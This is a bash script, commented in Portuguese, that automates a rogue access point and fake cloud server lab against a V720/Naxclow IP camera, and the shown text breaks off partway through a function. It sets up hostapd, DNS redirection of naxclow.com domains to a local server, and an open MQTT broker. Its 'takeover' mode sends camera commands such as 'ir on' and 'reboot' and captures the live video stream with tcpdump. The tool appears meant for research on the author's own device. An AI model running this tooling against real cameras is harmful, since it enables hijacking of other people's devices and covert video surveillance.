#!/usr/bin/env bash
#
# fakesrv_lab.sh — sobe/derruba o lab "fake server / AP isolado" inteiro.
# Uma execucao faz a Fase 1..5 do runbook_fakeserver_ap.md. Cada processo roda
# em BACKGROUND gravando num arquivo de log proprio em docs/mitm_out/.
# A Fase 6 (parear a camera pelo app V720) e MANUAL; as provas Fase 7 (MQTT) e
# Fase 8 (stream) rodam automaticas em 'fakesrv_lab.sh takeover'. 'cheat' mostra
# tudo na mao.
#
# Uso:
#   sudo ./scripts/fakesrv_lab.sh up            # sobe Fase 1..5 (processos em background)
#   sudo ./scripts/fakesrv_lab.sh up --terms    # idem + abre 1 janela de terminal por log (precisa GUI)
#   sudo ./scripts/fakesrv_lab.sh status        # PID vivo? portas? ultimas linhas de cada log
#   sudo ./scripts/fakesrv_lab.sh logs [nome] [N]   # despeja os logs (todos, ou so 'nome'); N linhas (default 40; 0 = tudo)
#   sudo ./scripts/fakesrv_lab.sh watch [nome]  # tail -f ao vivo (todos juntos, ou so 'nome')
#   sudo ./scripts/fakesrv_lab.sh takeover [cmd...]  # (apos a Fase 6) espera a camera online e roda Fase 7 + Fase 8
#   sudo ./scripts/fakesrv_lab.sh takeover --no-stream 'ir on'   # so a Fase 7, comando custom
#   sudo ./scripts/fakesrv_lab.sh bundle        # junta tudo (logs+status+configs+dmesg) num arquivo pra anexar/colar
#   sudo ./scripts/fakesrv_lab.sh cheat         # passos manuais da Fase 6/7/8
#   sudo ./scripts/fakesrv_lab.sh down          # mata tudo e restaura a rede (unmask NM etc)
#   sudo ./scripts/fakesrv_lab.sh restart [--terms]
#
# nomes de log: radio  hostapd  dnsmasq  mosquitto  mqtt  server  (takeover: proof  pcap)
#
# Overrides por env:
#   IFACE=wlan1 sudo ./scripts/fakesrv_lab.sh up     # dongle ath9k em vez da Intel interna
#   UPLINK=eth0 sudo ./scripts/fakesrv_lab.sh up     # + NAT: clientes do AP ganham internet (precisa 2a interface)
#   AP_IP=192.168.50.1 SSID=fakesrv PASS=fakesrv12345 CHANNEL=6 DEV=5c001502B330
#   TAKEOVER_CMDS='ir on;reboot'  ONLINE_TIMEOUT=180  RESP_WAIT=20  STREAM_SECS=15
#
set -uo pipefail

IFACE="${IFACE:-wlan0}"
AP_IP="${AP_IP:-192.168.50.1}"
SUBNET="${AP_IP%.*}"
SSID="${SSID:-fakesrv}"
PASS="${PASS:-fakesrv12345}"
CHANNEL="${CHANNEL:-6}"
DEV="${DEV:-5c001502B330}"
# Uplink opcional: interface COM internet (ex.: eth0 ou dongle wlan1). Se setada,
# o lab faz NAT entre o AP ($IFACE) e o uplink — clientes do 'fakesrv' ganham
# internet e o DNS fake continua valendo. Sem uplink (1 placa so), o AP fica
# isolado (sem internet) — e o app V720 pode abortar o provisionamento.
UPLINK="${UPLINK:-}"

# takeover (Fase 7/8 automatica) — overrides por env:
TAKEOVER_CMDS="${TAKEOVER_CMDS:-ir on;reboot}"   # sequencia p/ fake_srv_cmd.sh, separada por ';'
ONLINE_TIMEOUT="${ONLINE_TIMEOUT:-180}"          # s esperando a camera aparecer no MQTT
RESP_WAIT="${RESP_WAIT:-20}"                     # s coletando a resposta da camera apos os comandos
STREAM_SECS="${STREAM_SECS:-15}"                 # s de captura do /live na Fase 8
P2P_WAIT="${P2P_WAIT:-30}"                       # s esperando o registro P2P (relay) na Fase 8
RELAY_PORT="${RELAY_PORT:-29940}"                # porta do "relay" que a camera usa p/ registrar

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
SCRIPTS_DIR="$REPO_ROOT/scripts/fakeserver"
UTILS_DIR="$REPO_ROOT/scripts/utils"
OUT_DIR="$REPO_ROOT/docs/mitm_out"
LOG_DIR="$OUT_DIR"
RUN_DIR="$OUT_DIR/run"
HOSTAPD_CONF="/etc/hostapd/hostapd.conf"
DNSMASQ_CONF="/etc/dnsmasq.d/fakesrv.conf"
MOSQ_CONF="$OUT_DIR/mosquitto.conf"

# ordem = ordem de subida
SERVICES=(radio hostapd dnsmasq mosquitto mqtt server)

if [[ -t 1 ]]; then c_red=$'\e[31m'; c_grn=$'\e[32m'; c_yel=$'\e[33m'; c_dim=$'\e[2m'; c_rst=$'\e[0m'
else c_red=; c_grn=; c_yel=; c_dim=; c_rst=; fi
say()  { printf '%s\n' "$*"; }
ok()   { printf '%s[ok]%s %s\n' "$c_grn" "$c_rst" "$*"; }
warn() { printf '%s[!!]%s %s\n' "$c_yel" "$c_rst" "$*"; }
die()  { printf '%s[x]%s %s\n'  "$c_red" "$c_rst" "$*" >&2; exit 1; }

usage()     { sed -n '3,34p' "$0" | sed 's/^#\{1,\} \{0,1\}//'; }
need_root() { [[ $EUID -eq 0 ]] || die "precisa de root:  sudo $0 $*"; }
have()      { command -v "$1" >/dev/null 2>&1; }
log_of()    { echo "$LOG_DIR/$1.log"; }
pid_of()    { echo "$RUN_DIR/$1.pid"; }

alive() {  # alive <nome>
  local p; p=$(cat "$(pid_of "$1")" 2>/dev/null) || return 1
  [[ -n "$p" ]] && kill -0 "$p" 2>/dev/null
}

# camera online? = houve linha do $DEV no mosquitto.log nos ultimos ${1:-15}s
# (mosquitto -v prefixa cada linha com epoch: "1700000000: Received PINGREQ from <DEV>")
cam_online() {
  local win=${1:-15} now ts line
  now=$(date +%s)
  line=$(grep -aE "(from|as) ${DEV}([^0-9A-Za-z]|$)" "$(log_of mosquitto)" 2>/dev/null | tail -1)
  [[ -n "$line" ]] || return 1
  ts=${line%%:*}
  [[ "$ts" =~ ^[0-9]+$ ]] || return 1
  (( now - ts <= win ))
}

# bloqueia ate a camera aparecer no MQTT (0 = online, 1 = timeout em ONLINE_TIMEOUT)
wait_online() {
  local deadline=$(( $(date +%s) + ONLINE_TIMEOUT )) dots=0
  while (( $(date +%s) < deadline )); do
    if cam_online 15; then (( dots )) && echo; ok "camera $DEV online no MQTT"; return 0; fi
    (( dots++ )) || printf '  aguardando a camera %s conectar no MQTT (timeout %ss) ' "$DEV" "$ONLINE_TIMEOUT"
    printf '.'; sleep 2
  done
  (( dots )) && echo
  return 1
}

# descobre o <id> do stream: server.log primeiro, /dev/list como fallback
dev_stream_id() {
  local id
  id=$(grep -aoE 'registration request \(device: [^)]+\)' "$(log_of server)" 2>/dev/null \
        | tail -1 | sed -E 's/.*device: (.+)\)$/\1/')
  [[ -n "$id" ]] || id=$(grep -aoE 'Found device [A-Za-z0-9_.-]+' "$(log_of server)" 2>/dev/null \
        | tail -1 | awk '{print $3}')
  [[ -n "$id" ]] || id=$(curl -s --max-time 3 "http://$AP_IP/dev/list" 2>/dev/null \
        | grep -oE '"uid"[[:space:]]*:[[:space:]]*"[^"]+"' | head -1 | sed -E 's/.*"([^"]+)"$/\1/')
  echo "$id"
}

# IP que a camera pegou por DHCP (dnsmasq.log: "DHCPACK(wlan0) 192.168.50.x <mac>")
cam_ip() {
  grep -aoE 'DHCPACK\([^)]+\) [0-9.]+' "$(log_of dnsmasq)" 2>/dev/null | tail -1 | awk '{print $2}'
}

# ---- NAT opcional: da internet pros clientes do AP via uplink --------------
nat_up() {
  [[ -n "$UPLINK" ]] || return 0
  local upl="$UPLINK"
  ip link show "$upl" >/dev/null 2>&1 || { warn "UPLINK=$upl nao existe — seguindo SEM internet no AP"; return 0; }
  ip route get 1.1.1.1 2>/dev/null | grep -q "dev $upl " || { warn "UPLINK=$upl sem rota de internet — seguindo SEM internet no AP"; return 0; }
  say "NAT: clientes do AP ($IFACE) -> internet via $upl"
  sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
  iptables -t nat -C POSTROUTING -o "$upl" -j MASQUERADE 2>/dev/null \
    || iptables -t nat -A POSTROUTING -o "$upl" -j MASQUERADE
  iptables -C FORWARD -i "$IFACE" -o "$upl" -j ACCEPT 2>/dev/null \
    || iptables -A FORWARD -i "$IFACE" -o "$upl" -j ACCEPT
  iptables -C FORWARD -i "$upl" -o "$IFACE" -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null \
    || iptables -A FORWARD -i "$upl" -o "$IFACE" -m state --state ESTABLISHED,RELATED -j ACCEPT
  ok "internet liberada pros clientes do AP (via $upl)"
}

nat_down() {
  [[ -n "$UPLINK" ]] || return 0
  local upl="$UPLINK"
  ip link show "$upl" >/dev/null 2>&1 || return 0
  iptables -t nat -D POSTROUTING -o "$upl" -j MASQUERADE 2>/dev/null || true
  iptables -D FORWARD -i "$IFACE" -o "$upl" -j ACCEPT 2>/dev/null || true
  iptables -D FORWARD -i "$upl" -o "$IFACE" -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null || true
  sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1
}

# --- prova/diagnostico do registro P2P (relay no fake server) ---------------

# ja houve registro P2P? = server.log tem conexao aceita no relay apos o boot
# (a Fase 7 de controle via MQTT NAO precisa disso; a Fase 8/stream precisa).
# Nota: ignora "Waiting for connection" — o server.log sempre tem essa linha de startup.
p2p_registered() {
  grep -aqE "\[(TCP|UDP)-SRV :${RELAY_PORT}\] (Connected|New|Accept)" "$(log_of server)" 2>/dev/null \
    || grep -aqE "(Accept|connect|register).*:${RELAY_PORT}|Receive registration request|Found device" "$(log_of server)" 2>/dev/null
}

# ultimo Device/Info publicado pela camera no broker (proof.log ou mqtt.log)
# -> imprime so o JSON (aceita proof.log com "%I" ISO/epoch + topico, ou mqtt.log sem ts)
last_dev_info() {
  local f="$1"
  grep -a 'Device/Info' "$f" 2>/dev/null | tail -1 | sed -E 's/^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9:]{8}\+0000[[:space:]]+//; s/^[0-9]{10}[[:space:]]+//; s/^Naxclow\/P2P\/Users\/Device\/Info[[:space:]]+//'
}

# captura o baseline do Device/Info ANTES dos comandos, pra diff depois
baseline_info() {
  local f="$1" info
  info=$(last_dev_info "$f")
  [[ -n "$info" ]] || { warn "  sem Device/Info no $f ainda — a camera publica o Info so depois de conectar no broker"; return 1; }
  echo "$info" > "$OUT_DIR/takeover_${stamp}_baseline.json"
  say "  baseline Device/Info:"
  say "    $(echo "$info" | python3 -m json.tool 2>/dev/null | tr '\n' ' ' || echo "$info")"
  return 0
}

# diff dos campos do baseline vs o Info mais recente (prova de resposta viva)
diff_info() {
  local f="$1" info base key val
  info=$(last_dev_info "$f")
  [[ -n "$info" ]] || { warn "  (sem Info novo pra comparar)"; return 1; }
  [[ -f "$OUT_DIR/takeover_${stamp}_baseline.json" ]] || { warn "  (sem baseline salvo)"; return 1; }
  base=$(cat "$OUT_DIR/takeover_${stamp}_baseline.json")
  say "  diff Device/Info (baseline -> depois):"
  python3 - "$base" "$info" <<'PY'
import json,sys
a=json.loads(sys.argv[1]); b=json.loads(sys.argv[2])
keys=sorted(set(a)|set(b))
for k in keys:
    va,vb=a.get(k),b.get(k)
    if va!=vb:
        print(f"    {k}: {va!r} -> {vb!r}")
PY
  return 0
}

# watchdog do registro P2P: bloqueia ate a camera abrir o canal do relay no fake
# server (ou timeout em P2P_WAIT). Fase 8 usa isso p/ nao bater 30s em /dev/list.
p2p_watch() {
  local deadline=$(( $(date +%s) + P2P_WAIT ))
  say "  aguardando registro P2P da camera no fake server (:${RELAY_PORT}, timeout ${P2P_WAIT}s) ..."
  while (( $(date +%s) < deadline )); do
    p2p_registered && { ok "  registro P2P visto no server.log"; return 0; }
    sleep 2
  done
  warn "  sem conexao :${RELAY_PORT} no server.log em ${P2P_WAIT}s."
  return 1
}

check_deps() {
  local miss=()
  for b in hostapd dnsmasq mosquitto mosquitto_sub iw ip rfkill dig python3; do
    have "$b" || miss+=("$b")
  done
  ((${#miss[@]})) && die "falta no PATH: ${miss[*]}  (apt install hostapd dnsmasq mosquitto mosquitto-clients iw rfkill dnsutils)"
}

# --------------------------------------------------------------- background
start_bg() {  # start_bg <nome> <comando shell>
  local name=$1 cmd=$2
  : > "$(log_of "$name")"
  setsid bash -c "$cmd" >"$(log_of "$name")" 2>&1 &
  echo $! > "$(pid_of "$name")"
}

stop_bg() {  # stop_bg <nome>
  local name=$1 p
  p=$(cat "$(pid_of "$name")" 2>/dev/null) || return 0
  [[ -n "$p" ]] || return 0
  kill -TERM -- -"$p" 2>/dev/null || kill -TERM "$p" 2>/dev/null
  sleep 0.3
  kill -KILL -- -"$p" 2>/dev/null || true
  rm -f "$(pid_of "$name")"
}

# --------------------------------------------------------------- configs
write_configs() {
  mkdir -p "$OUT_DIR" "$RUN_DIR" "$(dirname "$HOSTAPD_CONF")" "$(dirname "$DNSMASQ_CONF")"

  cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
country_code=BR
ieee80211d=1

hw_mode=g
channel=$CHANNEL

# 11n desligado: e o gatilho mais comum do "Microcode SW error" do iwlwifi em AP.
# Religue (ieee80211n=1) so se o AP aguentar cliente + camera sem cair.
ieee80211n=0
wmm_enabled=0
uapsd_advertisement_enabled=0

auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0

wpa=2
wpa_passphrase=$PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP

beacon_int=100
dtim_period=2
EOF

  local upstream=""
  if [[ -n "$UPLINK" ]]; then
    upstream=$(ip route 2>/dev/null | awk -v u="$UPLINK" '$0 ~ "dev "u" " && /default/ {print $3; exit}')
    [[ -n "$upstream" ]] || upstream="8.8.8.8"
  fi

  cat > "$DNSMASQ_CONF" <<EOF
interface=$IFACE
except-interface=lo
bind-interfaces
dhcp-range=$SUBNET.10,$SUBNET.100,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/naxclow.com/$AP_IP
address=/naxclow.com.cn/$AP_IP
$( [[ -n "$upstream" ]] && echo "server=$upstream" )
log-queries
log-dhcp
EOF

  cat > "$MOSQ_CONF" <<EOF
listener 1883 0.0.0.0
allow_anonymous true
EOF
}

# --------------------------------------------------------------- fase 1
phase1_radio() {
  say "[1/6] Fase 1 — limpando o radio e configurando IP em $IFACE ..."
  systemctl stop NetworkManager wpa_supplicant 2>/dev/null
  systemctl mask NetworkManager wpa_supplicant 2>/dev/null
  have airmon-ng && airmon-ng check kill >/dev/null 2>&1
  pkill -f 'hostapd|dnsmasq -C.*fakesrv' 2>/dev/null

  iw dev | awk '/Unnamed/{u=1} /wdev/{w=$2} /type P2P-device/{if(u)print w; u=0}' \
    | while read -r w; do iw wdev "$w" del 2>/dev/null || true; done

  rfkill unblock wlan 2>/dev/null || true
  iw reg set BR 2>/dev/null || true

  ip link set "$IFACE" down                     || die "sem interface '$IFACE' (dongle plugado? IFACE certo?)"
  iw dev "$IFACE" set power_save off 2>/dev/null || true
  ip addr flush dev "$IFACE"
  ip addr add "$AP_IP/24" dev "$IFACE"
  ip link set "$IFACE" up
  iw dev "$IFACE" set power_save off 2>/dev/null || true

  local n; n=$(iw dev | grep -c Interface)
  (( n == 1 )) || warn "phy tem $n interfaces (esperado 1) — 'iw dev' pra ver o que sobrou"
  pgrep -x wpa_supplicant >/dev/null && warn "wpa_supplicant ainda vivo — vai fazer scan e derrubar o AP"
  sleep 1   # deixa a interface assentar antes do hostapd (evita "mode 3: -16 busy")
  ok "$IFACE up com $AP_IP/24"
}

# --------------------------------------------------------------- GUI terms
open_terms() {
  local gui_user="${SUDO_USER:-$USER}" t=
  for cand in x-terminal-emulator qterminal konsole gnome-terminal xfce4-terminal xterm; do
    have "$cand" && { t=$cand; break; }
  done
  [[ -n "$t" ]] || { warn "nenhum terminal grafico encontrado — use 'logs' / 'watch'"; return; }
  say "abrindo 1 janela por log com '$t' (fechar a janela NAO mata o processo) ..."
  local f title
  for name in "${SERVICES[@]}"; do
    f=$(log_of "$name"); title="fakesrv:$name"
    case "$t" in
      gnome-terminal|xfce4-terminal)
        setsid sudo -u "$gui_user" DISPLAY="${DISPLAY:-:0}" XAUTHORITY="/home/$gui_user/.Xauthority" \
          "$t" --title="$title" -- bash -c "tail -n +1 -F '$f'" >/dev/null 2>&1 & ;;
      konsole)
        setsid sudo -u "$gui_user" DISPLAY="${DISPLAY:-:0}" XAUTHORITY="/home/$gui_user/.Xauthority" \
          "$t" -p tabtitle="$title" -e bash -c "tail -n +1 -F '$f'" >/dev/null 2>&1 & ;;
      *)
        setsid sudo -u "$gui_user" DISPLAY="${DISPLAY:-:0}" XAUTHORITY="/home/$gui_user/.Xauthority" \
          "$t" -T "$title" -e bash -c "tail -n +1 -F '$f'" >/dev/null 2>&1 & ;;
    esac
  done
}

# --------------------------------------------------------------- up
cmd_up() {
  local terms=0; [[ "${1:-}" == "--terms" ]] && terms=1
  check_deps
  local running=0
  for s in "${SERVICES[@]}"; do alive "$s" && running=1; done
  (( running )) && die "lab ja parece no ar ('$0 status'). '$0 down' primeiro (ou 'restart')."

  write_configs
  phase1_radio

  say "[2/6] monitor do radio (dmesg) -> $(log_of radio)"
  start_bg radio "dmesg --follow-new 2>/dev/null || dmesg -w"

  say "[3/6] Fase 2 — hostapd (AP $SSID) -> $(log_of hostapd)"
  start_bg hostapd "hostapd -dd '$HOSTAPD_CONF'"
  local i up=0
  for ((i=0;i<20;i++)); do grep -qa 'AP-ENABLED' "$(log_of hostapd)" && { up=1; break; }; sleep 1; done
  (( up )) && ok "AP-ENABLED" || warn "sem AP-ENABLED em 20s — '$0 logs hostapd' e '$0 logs radio'"

  say "[4/6] Fase 3 — dnsmasq (DHCP + desvio DNS) -> $(log_of dnsmasq)"
  systemctl stop dnsmasq 2>/dev/null
  start_bg dnsmasq "dnsmasq -C '$DNSMASQ_CONF' -d"
  sleep 2
  local ans; ans=$(dig @"$AP_IP" v720.naxclow.com +short 2>/dev/null | head -1)
  [[ "$ans" == "$AP_IP" ]] && ok "checkpoint DNS: v720.naxclow.com -> $ans" \
    || warn "checkpoint DNS FALHOU: dig deu '${ans:-<nada>}' (esperado $AP_IP) — nada adiante funciona"

  say "[5/6] Fase 4 — mosquitto (broker MQTT) -> $(log_of mosquitto)"
  systemctl stop mosquitto 2>/dev/null
  start_bg mosquitto "mosquitto -v -c '$MOSQ_CONF'"
  sleep 1
  ss -tlnp 2>/dev/null | grep -q ':1883 ' && ok "mosquitto LISTEN :1883" || warn "mosquitto nao subiu em :1883 — '$0 logs mosquitto'"
  start_bg mqtt "exec mosquitto_sub -h $AP_IP -t '#' -v"

  say "[6/6] Fase 5 — fake server -> $(log_of server)"
  start_bg server "cd '$REPO_ROOT' && BROKER=$AP_IP FAKE_SRV_HOST=$AP_IP RELAY_PORT=${RELAY_PORT:-29940} python3 src/a9_naxclow.py -s -v"
  sleep 2
  ss -tlnp 2>/dev/null | grep -q ':80 ' && ok "fake server HTTP LISTEN :80" || warn "fake server HTTP nao subiu em :80 — '$0 logs server'"
  ss -tlnp 2>/dev/null | grep -q ":${RELAY_PORT:-29940} " && ok "fake server relay LISTEN :${RELAY_PORT:-29940}" || warn "fake server relay nao subiu em :${RELAY_PORT:-29940} — '$0 logs server'"

  (( terms )) && open_terms

  nat_up

  echo
  ok "Fase 1..5 no ar. Agora a Fase 6: parear a camera pelo app ('$0 cheat')."
  say "   ver ao vivo:   sudo $0 watch"
  say "   Fase 7 + 8:    sudo $0 takeover     (depois que a camera parear)"
  say "   pegar os logs: sudo $0 logs        (ou 'bundle' pra um arquivo so)"
  say "   derrubar:      sudo $0 down"
}

# --------------------------------------------------------------- down
cmd_down() {
  say "derrubando o lab ..."
  for s in "${SERVICES[@]}" proof pcap; do stop_bg "$s"; done
  pkill -f 'hostapd -dd'                 2>/dev/null
  pkill -f 'dnsmasq -C.*fakesrv'         2>/dev/null
  pkill -f 'mosquitto -v -c .*mitm_out'  2>/dev/null
  pkill -f 'a9_naxclow.py'               2>/dev/null
  pkill -f 'fake_srv_cmd.sh listen'      2>/dev/null
  pkill -f "mosquitto_sub -h $AP_IP -t Naxclow" 2>/dev/null
  pkill -f "tcpdump -i $IFACE -w .*takeover_"   2>/dev/null

  ip addr flush dev "$IFACE" 2>/dev/null
  iw dev "$IFACE" set power_save on 2>/dev/null || true
  rm -f "$DNSMASQ_CONF"

  nat_down

  systemctl unmask NetworkManager wpa_supplicant 2>/dev/null
  systemctl start NetworkManager 2>/dev/null

  sleep 1
  pgrep -a dnsmasq | grep -q fakesrv && warn "sobrou um dnsmasq — mata na mao (pgrep -a dnsmasq)"
  ok "rede restaurada. Logs preservados em $LOG_DIR/*.log ; hostapd.conf em $HOSTAPD_CONF"
}

# --------------------------------------------------------------- status
cmd_status() {
  printf '%-10s  %-6s  %-7s  %s\n' SERVICO ESTADO PID LOG
  for s in "${SERVICES[@]}"; do
    local p st; p=$(cat "$(pid_of "$s")" 2>/dev/null || echo -)
    if alive "$s"; then st="${c_grn}up  ${c_rst}"; else st="${c_red}down${c_rst}"; p=-; fi
    printf '%-10s  %b  %-7s  %s\n' "$s" "$st" "$p" "$(log_of "$s")"
  done
  echo
  say "portas:"
  ss -tlnp 2>/dev/null | grep -E ":(80|1883|53|${RELAY_PORT:-29940}) " | sed 's/^/  /' || say "  nenhuma (80/1883/53/${RELAY_PORT:-29940})"
  say "$IFACE:"
  ip -brief addr show "$IFACE" 2>/dev/null | sed 's/^/  /'
  iw dev "$IFACE" info 2>/dev/null | grep -E 'type|channel' | sed 's/^/  /'
  say "erros de radio (dmesg):"
  local re; re=$(dmesg 2>/dev/null | grep -iE 'iwlwifi.*(error|restart|inaccess)|Microcode SW error' | tail -3)
  [[ -n "$re" ]] && sed 's/^/  /' <<<"$re" || say "  nenhum (bom sinal)"
  echo
  say "ultimas linhas de cada log:"
  for s in "${SERVICES[@]}"; do
    printf '  %s--- %s ---%s\n' "$c_dim" "$s" "$c_rst"
    tail -n 3 "$(log_of "$s")" 2>/dev/null | sed 's/^/    /'
  done
  return 0
}

# --------------------------------------------------------------- logs
cmd_logs() {  # [nome] [N]
  local names=() n=40 a
  for a in "$@"; do
    if [[ "$a" =~ ^[0-9]+$ ]]; then n=$a
    elif [[ "$a" == all ]]; then n=0
    else names+=("$a"); fi
  done
  ((${#names[@]})) || names=("${SERVICES[@]}")
  for s in "${names[@]}"; do
    local f; f=$(log_of "$s")
    [[ -f "$f" ]] || { warn "sem log '$s'"; continue; }
    printf '\n========== %s  (%s)  ==========\n' "$s" "$( [[ $n -eq 0 ]] && echo 'log inteiro' || echo "ultimas $n linhas" )"
    if [[ $n -eq 0 ]]; then cat "$f"; else tail -n "$n" "$f"; fi
  done
  return 0
}

# --------------------------------------------------------------- watch
cmd_watch() {  # [nome...]
  local files=()
  if (($#)); then for s in "$@"; do files+=("$(log_of "$s")"); done
  else for s in "${SERVICES[@]}"; do files+=("$(log_of "$s")"); done; fi
  say "tail -f  (Ctrl-C sai; nao mata nada)"
  tail -n 5 -F "${files[@]}"
}

# --------------------------------------------------------------- bundle
cmd_bundle() {
  local out="$OUT_DIR/report_$(date +%Y%m%d_%H%M%S).txt"
  {
    echo "### fakesrv_lab bundle  $(date -Is)"
    echo "### IFACE=$IFACE AP_IP=$AP_IP SSID=$SSID CHANNEL=$CHANNEL"
    echo; echo "===== STATUS ====="; cmd_status
    echo; echo "===== hostapd.conf ====="; cat "$HOSTAPD_CONF" 2>/dev/null
    echo; echo "===== dnsmasq fakesrv.conf ====="; cat "$DNSMASQ_CONF" 2>/dev/null
    echo; echo "===== iw dev / iw reg ====="; iw dev 2>/dev/null; iw reg get 2>/dev/null
    echo; echo "===== dmesg iwlwifi (tail 60) ====="
    dmesg 2>/dev/null | grep -iE 'iwlwifi|wlan|cfg80211' | tail -60
    for s in "${SERVICES[@]}"; do
      echo; echo "===== LOG: $s ====="; cat "$(log_of "$s")" 2>/dev/null
    done
    for f in "$OUT_DIR"/takeover_*.log; do
      [[ -e "$f" ]] || continue
      echo; echo "===== TAKEOVER: $(basename "$f") ====="; cat "$f" 2>/dev/null
    done
  } | sed -r 's/\x1b\[[0-9;]*m//g' > "$out"
  ok "gerado: $out"
  say "manda esse arquivo aqui (ou: sudo $0 logs 0 | menos pra colar)"
}

# --------------------------------------------------------------- cheat
cmd_cheat() {
  cat <<EOF
================  fakesrv lab — passos manuais  ================
 AP:  SSID=$SSID  senha=$PASS  canal=$CHANNEL  IP=$AP_IP  iface=$IFACE

 FASE 6 — parear a camera (pelo celular):
   1. celular conecta no WiFi '$SSID' (senha $PASS)
   2. app V720 -> parear camera -> escolhe a rede '$SSID'
   3. camera reboota, entra no AP, registra
   cascata esperada (firmware novo):
     sudo $0 logs dnsmasq   -> DHCPACK ... $SUBNET.x  ->  query[A] v720.naxclow.com
     sudo $0 logs server    -> POST getDevInfo / a9bindingAppDevice (HTTP 200, do app)
     sudo $0 logs mosquitto -> New client ... as $DEV -> SUBSCRIBE .../Device/sub/$DEV
   IMPORTANTE: no firmware novo, a camera registra SOZINHA no "relay" assim que
   conecta — mas na porta 29940 (nao na 6123). O fake server agora escuta no
   relay (RELAY_PORT=${RELAY_PORT}) e no HTTP :80. Se o registro nao aparecer no
   server.log (procure 'Connected' / 'Receive registration request'), o app nao
   fecha o provisionamento (erro "provisionamento encerrou") e nao libera o viewer.

 FASE 7 + 8 — AUTOMATICAS (depois que a camera pareou na Fase 6):
   sudo $0 takeover                 # espera a camera online, manda '$TAKEOVER_CMDS',
                                    # coleta a resposta e faz a prova de stream sozinho
   sudo $0 takeover --no-stream 'ir on'   # so a Fase 7 com um comando custom
   artefatos: $OUT_DIR/takeover_<data>.{log,pcap,jpg,mjpg} + frames do extract

 FASE 7 na mao (se preferir), noutro terminal normal:
   cd $REPO_ROOT
   export BROKER=$AP_IP DEV=$DEV
   sudo $0 watch mqtt          # deixa aberto; manda o comando quando ver PINGREQ
   ./scripts/fake_srv_cmd.sh ir on
   ./scripts/fake_srv_cmd.sh reboot

 FASE 8 na mao (navegador do Kali) — so depois que a camera registrar no relay (${RELAY_PORT}):
   http://127.0.0.1/dev/list
   http://127.0.0.1/dev/<id>/live       (<id> sai em 'sudo $0 logs server')
   captura:  sudo tcpdump -i $IFACE -w $OUT_DIR/fakesrv_stream.pcap host $SUBNET.10
             python3 scripts/utils/extract_mitm_video.py $OUT_DIR/fakesrv_stream.pcap --out $OUT_DIR/fakesrv

 AP caiu / sumiu: ver "O AP cai / some" em docs/runbook_fakeserver_ap.md
==============================================================
EOF
}

# --------------------------------------------------------------- takeover (Fase 7 + 8)
cmd_takeover() {
  local do_stream=1
  [[ "${1:-}" == "--no-stream" ]] && { do_stream=0; shift; }
  local cmds="${*:-$TAKEOVER_CMDS}"

  alive mosquitto || die "broker MQTT nao esta no ar — 'sudo $0 up' primeiro"
  have curl       || die "falta 'curl' no PATH (apt install curl)"
  alive server    || warn "fake server nao esta vivo ('logs server') — Fase 8 provavelmente falha"
  (( do_stream )) && { have tcpdump || warn "sem 'tcpdump' — pcap do stream nao vai ser gravado (Fase 8 parcial)"; }

  local stamp; stamp=$(date +%Y%m%d_%H%M%S)
  local proof="$OUT_DIR/takeover_${stamp}.log"
  local pcap="$OUT_DIR/takeover_${stamp}.pcap"
  local snap="$OUT_DIR/takeover_${stamp}.jpg"
  local mjpg="$OUT_DIR/takeover_${stamp}.mjpg"

  say "================  FASE 7 + 8 automatica  ================"
  say "  DEV=$DEV  BROKER=$AP_IP  comandos: ${cmds//;/  |  }"
  say "  prova MQTT (com timestamp): $proof"

  # subscriber dedicado: e a prova do que a camera respondeu
  # (log SO do mosquitto_sub — marcadores de envio vao pro sent.log, arquivo separado)
  : > "$(log_of proof)"
  start_bg proof "exec mosquitto_sub -h $AP_IP -t 'Naxclow/#' -F '%I  %t  %p'"
  sleep 1

  # ---- FASE 7 ----
  say
  say "[7] esperando a camera parear/reconectar ..."
  if ! wait_online; then
    stop_bg proof
    die "camera $DEV nao apareceu no MQTT em ${ONLINE_TIMEOUT}s. Fez a Fase 6? ('sudo $0 logs mosquitto')"
  fi

  # baseline do Device/Info ANTES de mandar qualquer comando (diff = prova de resposta)
  baseline_info "$(log_of proof)" || true

  local sent_log="$OUT_DIR/takeover_${stamp}_sent.log"
  : > "$sent_log"

  local -a steps=(); local c
  IFS=';' read -ra steps <<< "$cmds"
  for c in "${steps[@]}"; do
    c="${c#"${c%%[![:space:]]*}"}"; c="${c%"${c##*[![:space:]]}"}"   # trim
    [[ -n "$c" ]] || continue
    cam_online 20 || { warn "camera caiu — reesperando antes de '$c'"; wait_online || { warn "desisti de '$c'"; break; }; }
    say "  -> $c"
    printf '%s  >>> ENVIADO: %s\n' "$(date +%H:%M:%S)" "$c" >> "$sent_log"
    ( cd "$REPO_ROOT" && BROKER="$AP_IP" DEV="$DEV" "$SCRIPTS_DIR/fake_srv_cmd.sh" $c ) 2>&1 | sed 's/^/     /'
    sleep 2
  done

  say "  coletando resposta da camera por ${RESP_WAIT}s ..."
  sleep "$RESP_WAIT"

  say
  say "  --- respostas da camera (topicos != /sub/ que publicamos) ---"
  grep -avE "Device/sub/${DEV}" "$(log_of proof)" | grep -aE 'Device/|>>> ENVIADO' | tail -40 | sed 's/^/    /' \
    || warn "nada da camera no proof — ela pode ter reconectado fora da janela"
  diff_info "$(log_of proof)" || true

  # ---- FASE 8 ----
  if (( do_stream )); then
    say
    say "[8] prova de stream"
    say "  esperando a camera voltar (reboot leva ~30-60s) ..."
    if wait_online; then
      # o stream so existe com o registro P2P no relay (:${RELAY_PORT}). Se a
      # camera nao registrou, /dev/list fica vazio pra sempre — aborta cedo.
      if p2p_registered || p2p_watch; then
        local cip; cip=$(cam_ip)
        [[ -n "$cip" ]] && say "  camera em $cip" || warn "  sem DHCPACK no dnsmasq.log — capturo sem filtro de host"
        if have tcpdump; then
          start_bg pcap "exec tcpdump -i '$IFACE' -w '$pcap' -U ${cip:+host $cip}"
          sleep 1
        fi
        local id i
        for ((i=0;i<15;i++)); do id=$(dev_stream_id); [[ -n "$id" ]] && break; sleep 2; done
